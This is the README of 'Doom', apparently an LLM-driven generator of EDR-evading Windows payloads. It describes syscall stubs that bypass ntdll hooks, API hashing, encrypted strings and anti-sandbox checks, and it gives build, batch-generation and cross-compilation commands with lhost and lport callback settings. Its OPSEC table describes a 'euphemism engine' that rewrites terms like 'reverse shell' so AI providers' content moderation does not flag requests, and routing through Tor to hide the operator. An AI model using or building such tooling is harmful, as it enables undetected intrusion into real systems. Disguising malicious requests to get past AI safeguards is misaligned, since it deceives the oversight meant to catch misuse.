## Technical Problem Space

Commercial EDR agents (such as CrowdStrike Falcon, Microsoft Defender for Endpoint, and SentinelOne) maintain static signatures and behavioral heuristics monitoring standard offensive frameworks. Common artifacts generated by off-the-shelf tools (e.g., Metasploit, standard Cobalt Strike artifact kits) rely on predictable API patterns, unmasked Import Address Table (IAT) entries, and standard Win32 call chains that are trivially flagged by userland hooks in `ntdll.dll`.

Doom solves this through deterministic evasion engineering:
1. Dynamic Code Generation: Produces completely unique control-flow structures, variable names, and algorithmic logic on every execution cycle.
2. Userland Hook Neutralization: Replaces hooked Win32 wrappers with direct/indirect system call stubs (Hell's Gate / Halo's Gate methodology).
3. Static Fingerprint Elimination: Resolves functions dynamically at runtime using hash functions (DJB2/Murmur), omitting target API names from the binary imports table.

## Evasion Capabilities

### Direct and Indirect System Calls
To circumvent API monitoring injected by AV/EDR into userland processes via `ntdll.dll`, Doom configures the code engine to generate system call stubs. These stubs parse `ntdll` in memory, locate System Service Numbers (SSNs), and execute syscall instructions directly, bypassing inline hooks.

### Dynamic API Hashing
Functions such as `VirtualAlloc`, `WriteProcessMemory`, and `CreateRemoteThread` are resolved dynamically using custom hash algorithms (e.g., DJB2, ROR13). Export tables of system libraries are traversed at runtime, ensuring no plaintext Windows API strings exist within the compiled artifact's Import Directory.

### Memory & String Obfuscation
Network indicators, configuration parameters, and execution strings are encrypted at rest using XOR or RC4 algorithms. Decryption occurs solely on the stack within volatile memory milliseconds prior to usage, minimizing the in-memory footprint analyzed by heuristic memory scanners.

### Anti-Sandbox and Timing Heuristics
Before establishing network sockets or executing stages, generated payloads implement environment validation checks:
- Non-emulated timing loops (verifying non-accelerated CPU clock execution).
- NUMA memory allocation checks (`VirtualAllocExNuma`) to detect virtualized sandbox hypervisors.
- Process tree validation and desktop artifact checks.

## OPSEC and Threat Model

Doom is built to protect the operator and client confidentiality:

| Threat Vector | Mitigation Strategy |
| :--- | :--- |
| Network IP Logging | Built-in SOCKS5 proxy support routes all cloud inference traffic through Tor or proxychains. The API provider never observes the operator's real IP address. |
| Client Data / NDA Breaches | Token Scrubber replaces operator IPs and domains with synthetic tokens prior to network dispatch. Values are rehydrated strictly on the client machine. |
| Cloud Account Suspension | Trigger-word euphemism engine rewrites terms (e.g., "reverse shell" becomes "diagnostic command bridge") to prevent content moderation flags. |
| Memory Key Extraction | API keys are managed using the `zeroize` crate. Heap memory containing secrets and authorization headers is overwritten with zeros upon drop. |
| Host Execution Safety | Source-only architecture. The CLI never executes or compiles arbitrary code automatically. An internal safety linter intercepts rogue downloaders. |
| Local Multi-User Snooping | Payloads are written to disk with POSIX file mode 0600 (owner read/write only). |
| Binary Forensic Leakage | Release builds employ `--remap-path-prefix` and symbol stripping to eliminate build paths, usernames, and toolchain identifiers from compiled binaries. |

## Installation

### Prerequisites
- Rust compiler and toolchain (1.80+ recommended, Rust 2024 edition compatible).
- Git.

### Building from Source
Clone the repository and compile with forensic path remapping:

```bash
git clone https://github.com/1MEshh/Doom.git
cd Doom
RUSTFLAGS="--remap-path-prefix=$HOME=/doom-build" cargo build --release
```

The compiled binary will be placed at:
```bash
./target/release/doom
```

## Usage

### Interactive Wizard (Recommended)
Launch the tool without flags to enter the interactive terminal interface:

```bash
./target/release/doom
```

The wizard guides through:
1. AI Engine selection (DeepSeek API, Local Ollama, OpenAI, Anthropic).
2. Network routing (Direct connection or Tor SOCKS5 proxy).
3. Payload output language (Rust `.rs`, C++ `.cpp`, C# `.cs`).
4. Architecture and evasion selection (Syscalls, Hashing, Encryption, Anti-Sandbox).
5. Target configuration and file persistence.

### Batch Automation Mode
For integration into automated CI/CD security pipelines or scripted simulations:

```bash
# Offline execution via local Ollama:
./target/release/doom -b -l rust --lhost 10.10.14.50 --lport 4444 -o payload.rs

# Cloud execution via DeepSeek over Tor:
export DEEPSEEK_API_KEY="sk-..."
./target/release/doom -b -e deepseek -p socks5://127.0.0.1:9050 -l cpp --lhost 10.10.14.50 --lport 8443 -o payload.cpp
```

## Cross-Compilation Recipes

Generated source files require compilation on a development system configured for the target environment.

### Rust Payloads (`.rs`)
Cross-compile for 64-bit Windows targets with stripped debug tables:
```bash
rustc --target x86_64-pc-windows-gnu -C opt-level=z -C panic=abort -C link-arg=-s payload.rs -o payload.exe
```

### C++ Payloads (`.cpp`)
Compile using the MinGW-w64 toolchain:
```bash
x86_64-w64-mingw32-g++ -s -O2 -mwindows payload.cpp -o payload.exe -lws2_32
```

### C# Payloads (`.cs`)
Compile using Roslyn or Mono:
```bash
csc /target:winexe /optimize+ /out:payload.exe payload.cs
```
